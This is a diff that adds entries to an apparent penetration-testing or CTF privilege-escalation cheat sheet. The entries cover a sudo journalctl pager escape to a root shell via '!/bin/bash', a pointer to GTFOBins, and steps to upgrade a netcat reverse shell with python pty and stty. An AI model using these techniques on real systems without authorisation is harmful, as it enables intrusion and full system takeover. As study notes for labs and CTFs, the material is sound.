@@ -297,6 +297,34 @@ toc_label: "Table of Contents"
   Nov 19 00:00:01 sun CRON[5627]: (sun) CMD (nodejs /home/sun/server.js >/dev/null 2>&1)
   Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
   ```
+* If we dont exactly remember how to use a given setuid command to get Privliges, use [Gtfobins](https://gtfobins.github.io/)
+* If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode and enter `!/bin/bash` to get root shell
+  ```
+  user@kali:~/bin$ cat new.sh 
+  #!/bin/bash
+  /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+  
+  root@kali:~/bin$ sh new.sh 
+  -- Logs begin at Sun 2019-11-17 19:19:25 EST, end at Mon 2019-11-18 17:13:44 EST. --
+  Nov 18 17:02:26 kali sudo[11538]: pam_unix(sudo:auth): authentication failure; logname= uid=33 eu
+  Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): conversation failed
+  Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): auth could not identify password for [www-
+  Nov 18 17:02:29 kali sudo[11538]: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=
+  Nov 18 17:02:29 kali crontab[11595]: (www-data) LIST (www-data)
+  !/bin/bash
+  root@kali:/home/david/bin# 
+  ```
+* To get the best Shell after taking control of the system
+  ```
+  www-data@machine:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
+  <html$ python3 -c "import pty;pty.spawn('/bin/bash')"                        
+  www-data@machine:/var/www/html$ ^Z
+  [1]+  Stopped                 nc -nlvp 443
+  root@kali:# stty raw -echo
+  ----------------------Here we need to type `fg` and press Enter `Twice`
+  root@kali:# nc -nlvp 443 
+  www-data@machine:/var/www/html$ TERM=xterm
+  ```
   
 ## Tools
 * Reconnoitre [Links](https://github.com/codingo/Reconnoitre) -- A security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
